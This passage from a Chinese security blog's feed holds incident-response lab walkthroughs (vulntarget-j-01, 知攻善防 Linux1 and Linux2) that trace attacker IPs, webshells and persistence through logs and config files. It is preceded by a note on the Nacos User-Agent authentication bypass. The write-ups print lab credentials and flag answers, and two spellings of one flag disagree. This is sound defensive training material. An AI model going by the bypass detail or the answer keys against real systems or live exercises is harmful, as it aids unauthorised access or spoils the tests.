TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的就很明确了。注释中写道，当接收到其他节点服务的请求时应该被通过，如何验证是其他服务。&lt;br>
就是很简单的⼀个对于UA的⼀个判断逻辑&lt;br>
这个Constants.NACOS_SERVER_HEADER跟踪⼀下，正是Nacos-Server 经过这⼀层的验证，那么则进⼊到filterChain 过滤器链中的下⼀个filter过滤器，继续接下来的请求。&lt;/p>
&lt;h1 id="6-漏洞修复">6. 漏洞修复&lt;/h1>
&lt;p>若业务环境允许，使⽤⽩名单限制相关web项⽬的访问来降低⻛险。 官⽅已发布最新安全版本，请及时下载升级⾄安全版本。&lt;/p></description></item><item><title>【应急响应靶场】vulntarget-j-01</title><link>http://localhost:1313/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BAvulntarget-j-01/</guid><description>&lt;img src="http://localhost:1313/images/7.webp" alt="Featured image of post 【应急响应靶场】vulntarget-j-01" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>题目来源公众号 vulntarget&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>任务环境说明：&lt;br>
windows账密：&lt;code>workstation/admin@20221123&lt;/code>&lt;br>
web端口外部无法访问，请RDP连接上机排查&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>主站进入后台的文件名称？&lt;/strong>&lt;br>
查看apache日志，找到php后缀日志。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155204.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155217.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{FNeSOgYGkp.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>黑客是从哪个端口上传木马文件的?&lt;/strong>&lt;br>
打开小皮查看网页端口，7001打不开，所以为80&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155247.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{80}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong>&lt;br>
直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155303.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155321.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{api3.php:Admin}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>可以根据日志查看：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250828155408.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.112.123}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>完成！！！&lt;/p></description></item><item><title>【知攻善防靶场】Linux1</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/</guid><description>&lt;img src="http://localhost:1313/images/8.webp" alt="Featured image of post 【知攻善防靶场】Linux1" />&lt;h1 id="前景需要">前景需要&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看监控的时候发现webshell告警&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">领导让你上机检查你可以救救安服仔吗&lt;/span>&lt;span class="err">！！&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span> &lt;span class="nx">黑客的IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span> &lt;span class="nx">遗留下的三个flag&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>虚拟机账号/密码&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">defend&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">defend&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">defend&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1-黑客的ip地址">1. 黑客的IP地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看日志文件&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">Linux查看&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp文件查看可疑IP登陆&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">last&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp&lt;/span> &lt;span class="nx">或者直接使用命令&lt;/span> &lt;span class="nx">lastlog命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看出192&lt;/span>&lt;span class="mf">.168.75.129&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">非常可疑&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201516.png" alt="Pasted image 20250301201516">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2-第一个flag">2. 第一个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">黑客使用root登录了系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们可以先去root用户下看看黑客使用了什么命令&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">history&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">得到第一个flag&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201537.png" alt="Pasted image 20250301201537">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3-第二个flag">3. 第二个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">从第一个flag中我们可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客对&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local进行编辑和提升了执行权限&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Linux中&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local&lt;/span> &lt;span class="nx">用于添加开机启动命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">使用ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">la&lt;/span> &lt;span class="err">，&lt;/span>&lt;span class="nx">查看有rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">直接用cat&lt;/span> &lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local得到第二个flag&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201615.png" alt="Pasted image 20250301201615">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">kfcvme50&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="4-第三个flag">4. 第三个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们通过查看log日志&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们发现一个redis日志文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">然后看一下redis日志并没有什么结果&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那么我们去看一下redis配置文件&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">more&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">redis&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">conf&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">就得到第三个flag&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201639.png" alt="Pasted image 20250301201639">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">ssWrd_redis&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="全部答案">全部答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">kfcvme50&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">ssW0rd_redis&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201658.png" alt="Pasted image 20250301201658">&lt;/p></description></item><item><title>【知攻善防靶场】Linux2</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/</guid><description>&lt;img src="http://localhost:1313/images/14.webp" alt="Featured image of post 【知攻善防靶场】Linux2" />&lt;h1 id="前提须知">前提须知&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看监控的时候发现webshell告警&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">领导让你上机检查你可以救救安服仔吗&lt;/span>&lt;span class="err">！！&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者IP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者修改的管理员密码&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">明文&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交第一次Webshell的连接URL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交Webshell连接密码&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交数据包的flag1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者使用的后续上传的木马文件名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者隐藏的flag2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">（&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">提交攻击者隐藏的flag3&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>虚拟机账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">Inch&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">957821.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1-提交攻击者ip">1. 提交攻击者IP&lt;/h1>
&lt;h3 id="方法一">方法一：&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">首先看一下管理员登录情况&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">确定一下黑客登录IP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">last&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015239.png" alt="image.png">&lt;/p>
&lt;h3 id="方法二">方法二：&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">如果不确定的话&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们可以登录bt面板看一下&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">这里我看var目录文件时&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">看到了bt配置文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那就bt看一下&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015259.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">果然安装了宝塔&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">那就登录一下&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">因为不知道面板的密码那我们就直接修改一下面板的密码&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015315.png" alt="image.png">&lt;br>
然后看一下面板的默认信息，看一下url地址&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
